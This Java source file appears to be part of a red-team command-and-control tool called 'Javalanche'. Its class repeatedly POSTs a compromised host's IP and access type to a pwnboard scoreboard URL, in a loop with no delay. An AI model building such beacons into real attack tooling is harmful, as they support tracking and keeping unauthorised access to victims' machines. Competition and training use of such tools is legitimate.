package Servers.C2;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Scanner;

public class pwnBoardRequest implements Runnable {
    private URI pwnboardUri = null;
    private URL pwnboardUrl = null;
    
    private String pwnboardData;

    public pwnBoardRequest(String IPAddress, String accessType) {
        try{
            this.pwnboardUri = new URI("https://pwnboard.win/generic");
            this.pwnboardUrl = this.pwnboardUri.toURL();
        } catch (URISyntaxException e){
            e.printStackTrace();
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        
        pwnboardData  = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"" + accessType + "\"}"; 
    }

    @Override
    public void run() {
        while(true){
            try {
                // Connect to pwnboard
                HttpURLConnection pwnboardConnection = (HttpURLConnection)pwnboardUrl.openConnection();
                pwnboardConnection.setDoOutput(true);
                pwnboardConnection.connect();

                // Send api request
                DataOutputStream writer = new DataOutputStream(pwnboardConnection.getOutputStream());

                writer.writeBytes(pwnboardData);
                writer.close();

                // Debug lines
                InputStream in = pwnboardConnection.getInputStream();
                Scanner scanner = new Scanner(in);

                while(scanner.hasNext()){
                    scanner.nextLine();
                }
                scanner.close();

                pwnboardConnection.disconnect();
            } catch (IOException e){
                System.out.println("when sending " + pwnboardData);
                e.printStackTrace();
            }   
        }
    }
    
}
